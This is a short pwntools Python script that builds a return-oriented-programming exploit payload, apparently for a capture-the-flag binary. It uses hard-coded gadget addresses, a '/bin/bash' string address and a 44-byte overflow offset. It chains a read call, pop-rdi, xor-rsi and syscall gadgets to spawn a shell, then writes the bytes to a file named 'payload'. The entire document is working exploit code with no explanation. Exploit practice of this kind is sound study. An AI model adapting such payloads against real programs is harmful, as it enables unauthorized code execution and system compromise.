from pwn import *

bin_bash_addr = 0x600100
syscall = 0x4000e4
xor_rsi_rsi = 0x4000ec
pop_rdi = 0x4000ea

read = 0x4000cb

offset = 44

def pad(s):
    return s + b"*" * (128 - len(s))

payload1 = b"A" * offset
payload1 += p64(read) + b"&" * 15 + p64(pop_rdi)[-1:] + p64(bin_bash_addr) + p64(syscall)

payload2 = b"B" * 44 + p64(xor_rsi_rsi) + p64(pop_rdi)[:7]

payload = pad(payload1) + payload2

f = open("payload", "wb")
f.write(payload)
f.close()